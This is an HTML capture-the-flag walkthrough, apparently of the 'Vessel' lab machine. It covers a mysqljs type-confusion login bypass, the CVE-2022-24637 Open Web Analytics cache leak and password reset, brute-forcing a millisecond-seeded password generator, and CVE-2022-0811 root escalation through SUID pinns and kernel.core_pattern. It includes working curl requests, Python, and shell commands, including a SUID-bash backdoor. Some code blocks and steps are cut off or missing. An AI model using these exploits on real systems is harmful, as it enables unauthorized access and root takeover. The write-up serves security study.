<h2 id="stage-3-authentication-bypass">Stage 3: Authentication Bypass</h2>
<h3 id="step-7-exploit-mysqljs-type-confusion">Step 7: Exploit mysqljs Type Confusion</h3>
<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -s -i -X POST http://vessel.htb/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&amp;password[password]=1" \
  -c /tmp/vessel_cookies.txt
</code></pre>
<p><strong>Mechanism:</strong> The <code>mysqljs</code> library is supposed to safely escape the <code>?</code> parameters. But when you pass an <strong>object</strong> instead of a string as a parameter, it behaves unexpectedly. The query becomes:</p>
<pre tabindex="0" aria-label="sql code or terminal block 9"><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
</code></pre>
<p>In MySQL, this evaluates as:</p>
<pre tabindex="0" aria-label="sql code or terminal block 10"><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND (password = `password`) = 1
</code></pre>
<p><code>password = password</code> is always true, so it becomes:</p>
<pre tabindex="0" aria-label="sql code or terminal block 11"><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1
</code></pre>
<p>Which returns the admin row, granting access. The lesson: <strong>parameterized queries are only safe if the library correctly handles all input types</strong>. Object injection into query parameters is a subtle but real vulnerability.</p>
<p> When you see "Security Fixes" in git history, Check if the fix is complete. Developers often fix the obvious issue but miss edge cases.</p>
<p><strong>Result:</strong> HTTP 302 redirect to <code>/admin</code> - we're logged in.</p>

<h3 id="step-10-understand-cve-2022-24637">Step 10: Understand CVE-2022-24637</h3>
<p>This CVE has two parts:</p>
<p><strong>Part 1 - Information Disclosure:</strong> OWA caches PHP objects to disk for performance. These cache files are stored in <code>owa-data/caches/</code> which is <strong>publicly accessible without authentication</strong>. The cache files are meant to be PHP files, but a bug in the caching code writes <code>&lt;?php\n</code> with a literal <code>\n</code> instead of a real newline, breaking the PHP tag. The file is served as plain text instead of being executed - so its contents are readable.</p>
<p>The cache file for a user contains the <strong>serialized user object</strong>, including the <code>temp_passkey</code> field - a token used for password resets.</p>
<p><strong>Part 2 - Mass Assignment → Log Poisoning → RCE:</strong> The OWA settings endpoint doesn't whitelist which configuration keys can be updated. By sending arbitrary <code>owa_config[key]</code> parameters, we can set hidden config options like <code>error_log_file</code> (change the log path to a <code>.php</code> file) and then write PHP code into that log file.</p>
<h3 id="step-11-trigger-password-reset-to-generate-cache">Step 11: Trigger Password Reset to Generate Cache</h3>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl -s -X POST "http://openwebanalytics.vessel.htb/index.php" \
  -d "owa_action=base.passwordResetRequest&amp;owa_email_address=admin@vessel.htb&amp;owa_submit=Request+New+Password"
</code></pre>
<p><strong>Why:</strong> A failed login also generates a cache, but the <code>temp_passkey</code> from a failed login isn't written to the database - so it can't be used to change the password. The password reset action (<code>base.passwordResetRequest</code>) <strong>generates a new temp_passkey AND writes it to the database</strong>, making it valid for the password change endpoint.</p>
<p><strong>Why <code>admin@vessel.htb</code> exists:</strong> We can confirm valid emails via the OWA "Forgot Password" form - it shows different responses for valid vs invalid emails. <code>admin@vessel.htb</code> returns success, confirming the account exists.</p>
<h3 id="step-12-fetch-the-cache-and-extract-temp-passkey">Step 12: Fetch the Cache and Extract temp_passkey</h3>
<p>The cache filename is predictable: <code>md5("user_id" + user_numeric_id)</code> where the admin's numeric ID is 1.</p>
<ul>
<li>Cache path: <code>/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php</code>
(<code>fafe1b60c24107ccd8f4562213e44849</code> = md5("id1"))</li>

<pre tabindex="0" aria-label="python code or terminal block 16"><code class="language-python" data-language="python"># exploit script

<p><strong>Why the filename is predictable:</strong> We can trace through the OWA source code to find exactly how cache filenames are generated. The key is in <code>fileCache.php</code>: filename = <code>md5($col . $this-&gt;get('id'))</code>. For the password reset path, <code>$col</code> is "id" and <code>$this-&gt;get('id')</code> is 1.</p>
<h3 id="step-13-change-admin-password">Step 13: Change Admin Password</h3>
<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">curl -s -i -X POST "http://openwebanalytics.vessel.htb/index.php" \

<p><strong>Mechanism:</strong> The <code>base.usersChangePassword</code> action only checks that the supplied <code>owa_k</code> token matches a <code>temp_passkey</code> in the database. It doesn't verify email ownership, session state, or any other factor. If the token matches, the password is changed. <p>The <code>passwordGenerator</code> is a <strong>PyInstaller-bundled Windows executable</strong>. PyInstaller packages a Python interpreter and scripts into a single <code>.exe</code>. We can reverse this:</p>
<ol>
<li>Use <code>pyinstxtractor</code> to unpack the PyInstaller archive → extracts <code>.pyc</code> files</li>

<p>The key function:</p>
<pre tabindex="0" aria-label="python code or terminal block 22"><code class="language-python" data-language="python">def genPassword(self):
    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
    qsrand(QTime.currentTime().msec())  # &lt;-- seed is milliseconds!
    password = ''
    for i in range(32):
        idx = qrand() % len(charset)
        password += charset[idx]
    return password
</code></pre>
<p><strong>The vulnerability:</strong> <code>QTime.currentTime().msec()</code> returns the current millisecond (0-999). There are only <strong>1000 possible seeds</strong>. This means there are only <strong>1000 possible passwords</strong> the app can generate, regardless of how "random" they look.</p>
<h3 id="step-19-generate-the-password-wordlist">Step 19: Generate the Password Wordlist</h3>
<p><strong>Critical insight - platform difference:</strong> The <code>passwordGenerator.exe</code> is a Windows binary. Qt's <code>qrand()</code> on Windows wraps the MSVC C runtime's <code>rand()</code>, which uses a simple LCG (Linear Congruential Generator):</p>
<pre tabindex="0" aria-label="Code or terminal block 23"><code>state = (state * 214013 + 2531011) &amp; 0xFFFFFFFF
return (state &gt;&gt; 16) &amp; 0x7FFF   # RAND_MAX = 32767 on Windows
</code></pre>
<p>Linux's <code>glibc</code> uses a completely different (more complex) RNG. Using Linux's <code>rand()</code> via ctypes would generate <strong>wrong passwords</strong>. We must replicate the Windows MSVC algorithm exactly.</p>
<pre tabindex="0" aria-label="python code or terminal block 24"><code class="language-python" data-language="python">import ctypes
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'

def msvc_srand(seed):
    global state
    state = seed &amp; 0xFFFFFFFF

def msvc_rand():
    global state
    state = (state * 214013 + 2531011) &amp; 0xFFFFFFFF
    return (state &gt;&gt; 16) &amp; 0x7FFF

for seed in range(1000):
    msvc_srand(seed)
    pwd = ''.join(charset[msvc_rand() % len(charset)] for _ in range(32))
    passwords.add(pwd)
</code></pre>
<p>This generates 1000 unique passwords covering every possible output of the generator.</p>

<h2 id="stage-6-privilege-escalation-to-root-cve-2022-0811">Stage 6: Privilege Escalation to Root (CVE-2022-0811)</h2>
<h3 id="step-23-identify-the-attack-vector">Step 23: Identify the Attack Vector</h3>
<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">ls -la /usr/bin/pinns
find / -name runc 2&gt;/dev/null
</code></pre>
<p><strong>Result:</strong></p>
<ul>
<li><code>/usr/bin/pinns</code> : SUID binary owned by root, executable by group <code>ethan</code></li>
<li><code>/usr/sbin/runc</code> : container runtime present</li>
</ul>
<p><strong>What is pinns?</strong> <code>pinns</code> is a utility from <strong>CRI-O</strong> (a container runtime for Kubernetes). Its job is to "pin" Linux namespaces - create new namespaces and bind them to files so they persist after all processes in them exit. It also accepts a <code>-s</code> flag to set <strong>sysctl kernel parameters</strong> within those namespaces.</p>
<p><strong>CVE-2022-0811:</strong> Because <code>pinns</code> is SUID root, it runs as root. The <code>-s</code> parameter lets it set <strong>any sysctl</strong>, including <code>kernel.core_pattern</code>. On Linux, <code>kernel.core_pattern</code> defines what happens when a process crashes (core dump). If it starts with <code>|</code>, the kernel pipes the core dump to that program <strong>as root</strong>.</p>
<h3 id="step-24-understanding-the-full-exploit-chain">Step 24: Understanding the Full Exploit Chain</h3>
<p>The exploit requires two simultaneous actions:</p>
<ol>
<li><strong>Set <code>kernel.core_pattern</code></strong> to execute our payload (via pinns SUID)</li>
<li><strong>Trigger a crash inside a runc container</strong> which uses the compromised core_pattern</li>
</ol>
<p>Why inside a container? Because <code>runc</code> containers run with elevated privileges (even rootless containers operate differently than regular processes), and triggering a segfault inside causes the kernel to invoke the core_pattern handler as root in the host's context.</p>
<h3 id="step-25-set-up-the-runc-container-session-1">Step 25: Set Up the runc Container (Session 1)</h3>
<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">mkdir /tmp/meow &amp;&amp; cd /tmp/meow
runc spec --rootless    # generate default OCI container spec
mkdir rootfs            # empty root filesystem
</code></pre>
<p>Modify <code>config.json</code> to:</p>
<ul>
<li>Disable terminal (avoid <code>/dev/console</code> issues)</li>
<li>Bind mount <code>/</code> from host into container (so we can access host filesystem)</li>
<li>Bind mount <code>/dev</code> from host (so devices work)</li>
<li>Clear device creation list</li>
</ul>
<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">runc --root /tmp/meow run alpine
</code></pre>
<p>This drops us into a container shell running as root (container root, not host root).</p>
<h3 id="step-26-create-the-payload-session-2">Step 26: Create the Payload (Session 2)</h3>
<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' &gt; /home/ethan/e.sh
chmod +x /home/ethan/e.sh
</code></pre>
<p><strong>Why chmod +s on bash:</strong> Setting the SUID bit on <code>/usr/bin/bash</code> means any user can run <code>bash -p</code> and get an effective UID of root. This is a permanent privilege escalation backdoor.</p>
<p><strong>Why <code>/home/ethan/</code> not <code>/tmp/</code>:</strong> The server runs a cleanup cron job that deletes <code>*.sh</code> files from <code>/tmp</code>. Putting the script in ethan's home directory avoids this.</p>
<h3 id="step-27-hijack-kernel-core-pattern-session-2">Step 27: Hijack kernel.core_pattern (Session 2)</h3>
<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">pinns -d /var/run \
      -f 844aa3c8-2c60-4245-a7df-9e26768ff303 \
      -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #' \
      --ipc --net --uts --cgroup
</code></pre>
<p><strong>Breaking down the parameters:</strong></p>
<ul>
<li><code>-d /var/run</code> : directory to store namespace pin files</li>
<li><code>-f &lt;uuid&gt;</code> : filename for the namespace pin files (any valid UUID)</li>
<li><code>-s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/home/ethan/e.sh #'</code> : sysctls to set. The <code>+</code> separates multiple sysctls. <code>kernel.core_pattern=|/home/ethan/e.sh #</code> sets the core dump handler to our script. The <code>#</code> at the end is a comment character that prevents any appended arguments from breaking the command.</li>
<li><code>--ipc --net --uts --cgroup</code> : namespace types to create/pin</li>
</ul>
<p><strong>Why this runs as root:</strong> <code>pinns</code> has the SUID bit set and is owned by root. When ethan runs it, the effective UID becomes root, and the sysctl write happens with root privileges. This is the exploit - a normal user can set <code>kernel.core_pattern</code> to an arbitrary path.</p>
<h3 id="step-28-trigger-core-dump-session-1-inside-container">Step 28: Trigger Core Dump (Session 1, inside container)</h3>
<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">ulimit -c unlimited    # enable core dumps
tail -f /dev/null &amp;    # background process to kill
kill -SIGSEGV %1       # send segfault signal → triggers core dump
</code></pre>
<p><strong>Why SIGSEGV:</strong> A segmentation fault (SIGSEGV) is one of the signals that triggers a core dump. When the process crashes, the kernel executes <code>kernel.core_pattern</code> - which is now our payload script - <strong>as root</strong>.</p>
<p>The payload runs: <code>chmod +s /usr/bin/bash</code> - setting the SUID bit.</p>
<h3 id="step-29-root-shell">Step 29: Root Shell</h3>
<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash"># Session 2:
ls -la /usr/bin/bash    # verify -rwsr-sr-x (SUID bit set)
bash -p                 # -p preserves effective UID (root)
cat /root/root.txt
</code></pre>
<p><strong>Why <code>bash -p</code>:</strong> By default, bash drops privileges when it detects it's being run with an effective UID different from the real UID (a security feature). The <code>-p</code> flag disables this behavior, keeping the root effective UID.</p>
